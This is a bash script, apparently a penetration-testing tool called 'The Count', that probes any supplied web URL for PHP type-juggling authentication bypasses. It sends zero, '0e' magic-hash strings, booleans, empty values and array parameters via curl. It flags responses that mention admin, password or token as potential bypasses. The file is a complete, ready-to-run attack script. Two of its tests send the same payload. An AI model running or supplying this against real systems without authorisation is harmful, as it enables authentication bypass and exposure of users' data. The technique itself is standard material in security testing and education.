#!/bin/bash

#############################################################################
#                                                                           #
#  ████████╗██╗  ██╗███████╗     ██████╗ ██████╗ ██╗   ██╗███╗   ██╗████████╗ #
#  ╚══██╔══╝██║  ██║██╔════╝    ██╔════╝██╔═══██╗██║   ██║████╗  ██║╚══██╔══╝ #
#     ██║   ███████║█████╗      ██║     ██║   ██║██║   ██║██╔██╗ ██║   ██║    #
#     ██║   ██╔══██║██╔══╝      ██║     ██║   ██║██║   ██║██║╚██╗██║   ██║    #
#     ██║   ██║  ██║███████╗    ╚██████╗╚██████╔╝╚██████╔╝██║ ╚████║   ██║    #
#     ╚═╝   ╚═╝  ╚═╝╚══════╝     ╚═════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝   ╚═╝    #
#                                                                           #
#############################################################################
#                                                                           #
#                   ⛵ PHP Type Juggling Testing Tool ⛵                     #
#                                                                           #
#  A comprehensive tool for testing PHP loose comparison vulnerabilities   #
#  that can lead to authentication bypass and security issues.              #
#                                                                           #
#  Author: TheCount                                                         #
#  Version: 1.0                                                             #
#  Date: December 10, 2025                                                  #
#                                                                           #
#############################################################################

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
RESET='\033[0m'
BOLD='\033[1m'

# Banner
print_banner() {
    echo -e "${CYAN}"
    cat << "EOF"
    ⛵⛵⛵⛵⛵⛵⛵⛵⛵⛵⛵⛵⛵⛵⛵⛵⛵⛵⛵⛵⛵⛵⛵⛵⛵⛵⛵⛵⛵⛵⛵⛵⛵
    ⛵                                               ⛵
    ⛵            ⚓ THE COUNT ⚓                     ⛵
    ⛵    PHP Type Juggling Testing Tool            ⛵
    ⛵                                               ⛵
    ⛵          Sailing the seas of                 ⛵
    ⛵         loose comparisons...                 ⛵
    ⛵                                               ⛵
    ⛵⛵⛵⛵⛵⛵⛵⛵⛵⛵⛵⛵⛵⛵⛵⛵⛵⛵⛵⛵⛵⛵⛵⛵⛵⛵⛵⛵⛵⛵⛵⛵⛵
EOF
    echo -e "${RESET}"
}

# Usage information
usage() {
    echo -e "${BOLD}${CYAN}Usage:${RESET}"
    echo -e "  $0 -t TARGET_URL [-p PARAMETER] [-m METHOD] [-c COOKIE] [-o OUTPUT]"
    echo ""
    echo -e "${BOLD}${CYAN}Options:${RESET}"
    echo -e "  ${GREEN}-t${RESET}  Target URL (required)"
    echo -e "      Example: -t http://target.com/api/auth"
    echo ""
    echo -e "  ${GREEN}-p${RESET}  Parameter name to test (default: 'token')"
    echo -e "      Example: -p username"
    echo ""
    echo -e "  ${GREEN}-m${RESET}  HTTP method (GET or POST, default: GET)"
    echo -e "      Example: -m POST"
    echo ""
    echo -e "  ${GREEN}-c${RESET}  Cookie header (optional)"
    echo -e "      Example: -c 'PHPSESSID=abc123'"
    echo ""
    echo -e "  ${GREEN}-o${RESET}  Output file (default: type_juggling_results.txt)"
    echo -e "      Example: -o results.txt"
    echo ""
    echo -e "  ${GREEN}-h${RESET}  Show this help message"
    echo ""
    echo -e "${BOLD}${CYAN}Examples:${RESET}"
    echo -e "  # Test GET parameter 'token'"
    echo -e "  $0 -t http://example.com/user -p token"
    echo ""
    echo -e "  # Test POST login with session cookie"
    echo -e "  $0 -t http://example.com/api/v1/auth -p password -m POST -c 'PHPSESSID=xyz'"
    echo ""
    echo -e "${BOLD}${CYAN}What is Type Juggling?${RESET}"
    echo -e "  PHP uses loose comparison (==) which automatically converts types."
    echo -e "  This can lead to unexpected behavior:"
    echo -e "    ${YELLOW}0 == \"0e123456\"${RESET}  → ${GREEN}TRUE${RESET}  (scientific notation becomes 0)"
    echo -e "    ${YELLOW}0 == \"abc\"${RESET}      → ${GREEN}TRUE${RESET}  (non-numeric string becomes 0)"
    echo -e "    ${YELLOW}true == 1${RESET}        → ${GREEN}TRUE${RESET}  (boolean conversion)"
    echo ""
    exit 1
}

# Print colored status
print_status() {
    local status=$1
    local message=$2
    case $status in
        "info")
            echo -e "${BLUE}[*]${RESET} ${message}"
            ;;
        "success")
            echo -e "${GREEN}[+]${RESET} ${message}"
            ;;
        "warning")
            echo -e "${YELLOW}[!]${RESET} ${message}"
            ;;
        "error")
            echo -e "${RED}[-]${RESET} ${message}"
            ;;
        "found")
            echo -e "${MAGENTA}[★]${RESET} ${BOLD}${message}${RESET}"
            ;;
    esac
}

# Test header
print_test_header() {
    echo ""
    echo -e "${CYAN}═══════════════════════════════════════════════${RESET}"
    echo -e "${CYAN}$1${RESET}"
    echo -e "${CYAN}═══════════════════════════════════════════════${RESET}"
}

# Test a payload
test_payload() {
    local description=$1
    local payload=$2
    local method=$3
    local url=$4
    local param=$5
    local cookie=$6
    
    print_status "info" "Testing: ${BOLD}${description}${RESET}"
    
    local response=""
    local http_code=""
    
    if [ "$method" = "GET" ]; then
        if [ -n "$cookie" ]; then
            response=$(curl -s -w "\nHTTP_CODE:%{http_code}" "${url}?${param}=${payload}" -H "Cookie: ${cookie}")
        else
            response=$(curl -s -w "\nHTTP_CODE:%{http_code}" "${url}?${param}=${payload}")
        fi
    else  # POST
        if [ -n "$cookie" ]; then
            response=$(curl -s -X POST -w "\nHTTP_CODE:%{http_code}" "$url" \
                -H "Content-Type: application/x-www-form-urlencoded" \
                -H "Cookie: ${cookie}" \
                --data "${param}=${payload}")
        else
            response=$(curl -s -X POST -w "\nHTTP_CODE:%{http_code}" "$url" \
                -H "Content-Type: application/x-www-form-urlencoded" \
                --data "${param}=${payload}")
        fi
    fi
    
    http_code=$(echo "$response" | grep "HTTP_CODE:" | cut -d':' -f2)
    response_body=$(echo "$response" | sed '/HTTP_CODE:/d')
    
    # Log to file
    echo "" >> "$OUTPUT_FILE"
    echo "═══════════════════════════════════════════════" >> "$OUTPUT_FILE"
    echo "TEST: $description" >> "$OUTPUT_FILE"
    echo "PAYLOAD: $payload" >> "$OUTPUT_FILE"
    echo "HTTP CODE: $http_code" >> "$OUTPUT_FILE"
    echo "═══════════════════════════════════════════════" >> "$OUTPUT_FILE"
    echo "$response_body" >> "$OUTPUT_FILE"
    
    # Analyze response
    local response_length=${#response_body}
    
    if [ "$http_code" = "200" ] || [ "$http_code" = "302" ]; then
        # Check for success indicators
        if echo "$response_body" | grep -qiE '(success|login|authenticated|token|user|admin|data|password|hash)'; then
            print_status "found" "POTENTIAL BYPASS! HTTP $http_code - Response contains interesting data"
            echo "ANALYSIS: POTENTIAL BYPASS FOUND!" >> "$OUTPUT_FILE"
            FINDINGS_COUNT=$((FINDINGS_COUNT + 1))
        elif [ $response_length -gt 100 ]; then
            print_status "warning" "Large response (${response_length} bytes) - HTTP $http_code"
            echo "ANALYSIS: Unusual response size - worth investigating" >> "$OUTPUT_FILE"
        else
            print_status "info" "HTTP $http_code - Response length: ${response_length}"
        fi
    elif [ "$http_code" = "500" ]; then
        print_status "warning" "Server error (500) - Possible type error triggered"
        echo "ANALYSIS: Server error - payload may have caused type confusion" >> "$OUTPUT_FILE"
    else
        print_status "info" "HTTP $http_code - Response length: ${response_length}"
    fi
}

# Parse arguments
TARGET_URL=""
PARAMETER="token"
METHOD="GET"
COOKIE=""
OUTPUT_FILE="type_juggling_results.txt"

while getopts "t:p:m:c:o:h" opt; do
    case $opt in
        t) TARGET_URL="$OPTARG" ;;
        p) PARAMETER="$OPTARG" ;;
        m) METHOD="$OPTARG" ;;
        c) COOKIE="$OPTARG" ;;
        o) OUTPUT_FILE="$OPTARG" ;;
        h) usage ;;
        *) usage ;;
    esac
done

# Validate required arguments
if [ -z "$TARGET_URL" ]; then
    print_status "error" "Target URL is required!"
    echo ""
    usage
fi

# Validate METHOD
if [ "$METHOD" != "GET" ] && [ "$METHOD" != "POST" ]; then
    print_status "error" "Method must be GET or POST"
    exit 1
fi

# Print banner
print_banner

# Initialize output file
cat > "$OUTPUT_FILE" << EOF
═══════════════════════════════════════════════════════════════
         THE COUNT - PHP Type Juggling Test Results
═══════════════════════════════════════════════════════════════
Target URL: $TARGET_URL
Parameter:  $PARAMETER
Method:     $METHOD
Cookie:     ${COOKIE:-None}
Date:       $(date)
═══════════════════════════════════════════════════════════════

EOF

print_status "info" "Target: ${BOLD}${TARGET_URL}${RESET}"
print_status "info" "Parameter: ${BOLD}${PARAMETER}${RESET}"
print_status "info" "Method: ${BOLD}${METHOD}${RESET}"
[ -n "$COOKIE" ] && print_status "info" "Cookie: ${BOLD}${COOKIE}${RESET}"
print_status "info" "Output: ${BOLD}${OUTPUT_FILE}${RESET}"

FINDINGS_COUNT=0

# Test 1: Boolean values
print_test_header "TEST 1: Boolean Values"
test_payload "Boolean true" "true" "$METHOD" "$TARGET_URL" "$PARAMETER" "$COOKIE"
test_payload "Boolean false" "false" "$METHOD" "$TARGET_URL" "$PARAMETER" "$COOKIE"

# Test 2: Integer zero
print_test_header "TEST 2: Integer Zero (Most Common Bypass)"
test_payload "Integer 0" "0" "$METHOD" "$TARGET_URL" "$PARAMETER" "$COOKIE"

# Test 3: Scientific notation
print_test_header "TEST 3: Scientific Notation"
test_payload "0e0 (zero in scientific notation)" "0e0" "$METHOD" "$TARGET_URL" "$PARAMETER" "$COOKIE"
test_payload "0e1 (zero times 10^1)" "0e1" "$METHOD" "$TARGET_URL" "$PARAMETER" "$COOKIE"
test_payload "0e215962017 (magic hash format)" "0e215962017" "$METHOD" "$TARGET_URL" "$PARAMETER" "$COOKIE"

# Test 4: Null values
print_test_header "TEST 4: Null Values"
test_payload "Empty string" "" "$METHOD" "$TARGET_URL" "$PARAMETER" "$COOKIE"
test_payload "String 'null'" "null" "$METHOD" "$TARGET_URL" "$PARAMETER" "$COOKIE"

# Test 5: Array manipulation (GET only)
if [ "$METHOD" = "GET" ]; then
    print_test_header "TEST 5: Array Manipulation"
    # Note: These need special handling in curl
    print_status "info" "Testing: ${BOLD}Array []=1${RESET}"
    if [ -n "$COOKIE" ]; then
        response=$(curl -s -w "\nHTTP_CODE:%{http_code}" "${TARGET_URL}?${PARAMETER}[]=1" -H "Cookie: ${COOKIE}")
    else
        response=$(curl -s -w "\nHTTP_CODE:%{http_code}" "${TARGET_URL}?${PARAMETER}[]=1")
    fi
    http_code=$(echo "$response" | grep "HTTP_CODE:" | cut -d':' -f2)
    response_body=$(echo "$response" | sed '/HTTP_CODE:/d')
    echo "" >> "$OUTPUT_FILE"
    echo "═══════════════════════════════════════════════" >> "$OUTPUT_FILE"
    echo "TEST: Array manipulation - ${PARAMETER}[]=1" >> "$OUTPUT_FILE"
    echo "HTTP CODE: $http_code" >> "$OUTPUT_FILE"
    echo "═══════════════════════════════════════════════" >> "$OUTPUT_FILE"
    echo "$response_body" >> "$OUTPUT_FILE"
    if [ "$http_code" = "500" ]; then
        print_status "warning" "Server error (500) - Array may have caused type error"
    else
        print_status "info" "HTTP $http_code"
    fi
fi

# Test 6: Magic hash values
print_test_header "TEST 6: Common Magic Hash Values"
test_payload "Magic hash: 240610708" "240610708" "$METHOD" "$TARGET_URL" "$PARAMETER" "$COOKIE"
test_payload "Magic hash: QNKCDZO" "QNKCDZO" "$METHOD" "$TARGET_URL" "$PARAMETER" "$COOKIE"

# Test 7: String to number comparisons
print_test_header "TEST 7: String to Number Coercion"
test_payload "Integer 1" "1" "$METHOD" "$TARGET_URL" "$PARAMETER" "$COOKIE"
test_payload "String '1'" "1" "$METHOD" "$TARGET_URL" "$PARAMETER" "$COOKIE"

# Summary
echo ""
print_test_header "TEST SUMMARY"

if [ $FINDINGS_COUNT -gt 0 ]; then
    print_status "found" "Found ${FINDINGS_COUNT} potential bypass(es)!"
    echo ""
    print_status "success" "Check ${OUTPUT_FILE} for detailed results"
    echo ""
    echo -e "${YELLOW}${BOLD}⚠ RECOMMENDATIONS:${RESET}"
    echo -e "  1. Review responses marked as 'POTENTIAL BYPASS'"
    echo -e "  2. Check for leaked data (passwords, tokens, user info)"
    echo -e "  3. Test manually with interesting payloads"
    echo -e "  4. Look for authentication bypass possibilities"
else
    print_status "info" "No obvious bypasses detected"
    echo ""
    print_status "info" "Check ${OUTPUT_FILE} for all response details"
    echo ""
    echo -e "${CYAN}${BOLD}ℹ NOTE:${RESET}"
    echo -e "  Some bypasses may not be obvious from automated testing."
    echo -e "  Review the output file for unusual response sizes or patterns."
fi

echo ""
print_status "success" "Testing complete! Results saved to: ${BOLD}${OUTPUT_FILE}${RESET}"
echo ""

# Generate summary statistics
echo "" >> "$OUTPUT_FILE"
echo "═══════════════════════════════════════════════════════════════" >> "$OUTPUT_FILE"
echo "                        SUMMARY" >> "$OUTPUT_FILE"
echo "═══════════════════════════════════════════════════════════════" >> "$OUTPUT_FILE"
echo "Potential findings: $FINDINGS_COUNT" >> "$OUTPUT_FILE"
echo "Test completed: $(date)" >> "$OUTPUT_FILE"
echo "═══════════════════════════════════════════════════════════════" >> "$OUTPUT_FILE"

exit 0
